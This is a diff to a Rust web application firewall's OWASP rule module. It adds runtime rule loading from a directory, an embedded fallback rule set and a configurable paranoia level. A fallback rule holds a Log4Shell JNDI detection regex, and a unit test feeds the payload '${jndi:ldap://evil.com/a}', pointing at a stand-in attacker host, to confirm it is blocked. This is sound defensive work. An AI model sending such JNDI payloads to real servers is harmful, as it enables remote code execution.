@@ -1,10 +1,11 @@
 //! OWASP Core Rule Set (CRS) — native Rust implementation.
 //!
-//! Rules are loaded from `rules/owasp-crs.yaml` at build time (embedded)
-//! and can optionally be overridden at runtime by a file on disk.
+//! Rules are loaded at runtime from the `rules/owasp-crs/` directory (YAML
+//! files).  If the directory cannot be found, a minimal embedded rule set is
+//! used as a fallback.
 //!
 //! Each rule has a `paranoia` level (1–4).  Only rules with
-//! `paranoia <= host.defense_config.owasp_paranoia` are evaluated.
+//! `paranoia <= defense_config.owasp_paranoia` are evaluated.
 //! Default paranoia level is 1 (most permissive).
 
 use std::path::Path;
@@ -17,29 +18,77 @@ use waf_common::{DetectionResult, Phase, RequestCtx};
 
 use super::Check;
 
-// ── Embedded default rules ────────────────────────────────────────────────────
+// ── Minimal embedded fallback rules ──────────────────────────────────────────
+// Used when the rules/owasp-crs/ directory cannot be found at runtime.
 
-const DEFAULT_RULES_YAML: &str =
-    include_str!("../../../../rules/owasp-crs.yaml");
+const EMBEDDED_RULES_YAML: &str = r#"
+version: "1.0"
+paranoia_level: 1
+rules:
+  - id: BUILTIN-911100
+    name: Method is not allowed by policy
+    category: protocol
+    severity: critical
+    paranoia: 1
+    field: method
+    operator: not_in
+    value:
+      - GET
+      - POST
+      - PUT
+      - DELETE
+      - PATCH
+      - HEAD
+      - OPTIONS
+      - CONNECT
+      - TRACE
+    action: block
+
+  - id: BUILTIN-920160
+    name: Request body too large (>10 MB)
+    category: protocol
+    severity: critical
+    paranoia: 1
+    field: content_length
+    operator: gt
+    value: 10485760
+    action: block
+
+  - id: BUILTIN-944150
+    name: 'Potential RCE: Log4j / Log4shell JNDI injection'
+    category: java-injection
+    severity: critical
+    paranoia: 1
+    field: all
+    operator: regex
+    value: '(?i)(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)(?:[^\}]{0,15}(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)|jndi|ctx)'
+    action: block
+"#;
 
 // ── YAML schema ───────────────────────────────────────────────────────────────
 
 #[derive(Debug, Deserialize)]
 struct RuleSet {
     #[allow(dead_code)]
+    #[serde(default)]
     version: String,
     #[allow(dead_code)]
+    #[serde(default = "default_paranoia_level")]
     paranoia_level: u8,
     rules: Vec<YamlRule>,
 }
+
+fn default_paranoia_level() -> u8 { 1 }
 
 #[derive(Debug, Deserialize)]
 struct YamlRule {
     id: String,
     name: String,
     #[allow(dead_code)]
+    #[serde(default)]
     category: String,
     #[allow(dead_code)]
+    #[serde(default)]
     severity: String,
     paranoia: u8,
     field: String,
@@ -84,7 +133,7 @@ impl CompiledRule {
             CompiledMatcher::Regex(re) => {
                 match self.field.as_str() {
                     "all" => {
-                        // Check path, query, body
+                        // Check path, query, body, headers
                         let body = String::from_utf8_lossy(&ctx.body_preview);
                         re.is_match(&ctx.path)
                             || re.is_match(&ctx.query)
@@ -126,8 +175,8 @@ impl CompiledRule {
             "path" => Some(ctx.path.clone()),
             "query" => Some(ctx.query.clone()),
             "content_length" => Some(ctx.content_length.to_string()),
-            "content_type" => ctx.headers.get("content-type").cloned(),
-            "user_agent" => ctx.headers.get("user-agent").cloned(),
+            "content_type" | "header_content_type" => ctx.headers.get("content-type").cloned(),
+            "user_agent" | "header_user_agent" => ctx.headers.get("user-agent").cloned(),
             "body" => Some(String::from_utf8_lossy(&ctx.body_preview).into_owned()),
             "path_length" => Some(ctx.path.len().to_string()),
             "query_arg_count" => {
@@ -147,12 +196,71 @@ pub struct OWASPCheck {
 }
 
 impl OWASPCheck {
-    /// Create with default embedded rules.
+    /// Create by loading rules from `rules/owasp-crs/` relative to the
+    /// current working directory.  Falls back to the minimal embedded rule
+    /// set if the directory is absent or yields zero compiled rules.
     pub fn new() -> Self {
-        Self::from_yaml(DEFAULT_RULES_YAML)
+        let dir = Path::new("rules/owasp-crs");
+        if dir.is_dir() {
+            let loaded = Self::from_directory(dir);
+            if loaded.rule_count() > 0 {
+                return loaded;
+            }
+            warn!("rules/owasp-crs/ exists but yielded 0 rules; using embedded fallback");
+        } else {
+            debug!("rules/owasp-crs/ not found; using embedded OWASP rule fallback");
+        }
+        Self::from_yaml(EMBEDDED_RULES_YAML)
     }
 
-    /// Create from a YAML string.
+    /// Load all `.yaml` files from a directory, merging their rule lists.
+    pub fn from_directory(dir: &Path) -> Self {
+        let mut rules = Vec::new();
+
+        let entries = match std::fs::read_dir(dir) {
+            Ok(e) => e,
+            Err(err) => {
+                warn!("Cannot read OWASP rules dir {}: {}", dir.display(), err);
+                return Self { rules };
+            }
+        };
+
+        for entry in entries.flatten() {
+            let path = entry.path();
+            if path.extension().and_then(|e| e.to_str()) != Some("yaml") {
+                continue;
+            }
+            let content = match std::fs::read_to_string(&path) {
+                Ok(c) => c,
+                Err(e) => {
+                    warn!("Failed to read {}: {}", path.display(), e);
+                    continue;
+                }
+            };
+            let ruleset: RuleSet = match serde_yaml::from_str(&content) {
+                Ok(r) => r,
+                Err(e) => {
+                    warn!("Failed to parse {}: {}", path.display(), e);
+                    continue;
+                }
+            };
+            let count_before = rules.len();
+            for r in ruleset.rules {
+                if let Some(cr) = compile_rule(r) {
+                    rules.push(cr);
+                }
+            }
+            debug!(
+                "Loaded {} rules from {}",
+                rules.len() - count_before,
+                path.display()
+            );
+        }
+
+        Self { rules }
+    }
+
+    /// Create from a YAML string (single-document, `RuleSet` format).
     pub fn from_yaml(yaml: &str) -> Self {
         let ruleset: RuleSet = match serde_yaml::from_str(yaml) {
             Ok(r) => r,
@@ -171,7 +279,7 @@ impl OWASPCheck {
         Self { rules }
     }
 
-    /// Try to load rules from a file path, falling back to defaults on error.
+    /// Try to load from a single YAML file, falling back to defaults on error.
     pub fn from_file_or_default(path: &Path) -> Self {
         match std::fs::read_to_string(path) {
             Ok(content) => {
@@ -234,7 +342,7 @@ fn compile_rule(r: YamlRule) -> Option<CompiledRule> {
             CompiledMatcher::Lt(n)
         }
         op => {
-            warn!("Unknown OWASP rule operator '{}' in rule {}", op, r.id);
+            debug!("Skipping OWASP rule {} with unsupported operator '{}'", r.id, op);
             return None;
         }
     };
@@ -261,8 +369,8 @@ impl Check for OWASPCheck {
             return None;
         }
 
-        // Paranoia level from defense config (default 1)
-        let paranoia = 1u8; // TODO: add paranoia_level to DefenseConfig
+        // Use paranoia level from defense config (default 1)
+        let paranoia = ctx.host_config.defense_config.owasp_paranoia;
 
         for rule in &self.rules {
             if rule.paranoia > paranoia {
@@ -347,8 +455,7 @@ mod tests {
     #[test]
     fn test_log4shell_blocked() {
         let checker = OWASPCheck::new();
-        let mut ctx = make_ctx("GET", "/${jndi:ldap://evil.com/a}", 0);
-        // put it in path
+        let mut ctx = make_ctx("GET", "/", 0);
         ctx.path = "${jndi:ldap://evil.com/a}".into();
         assert!(checker.check(&ctx).is_some());
     }
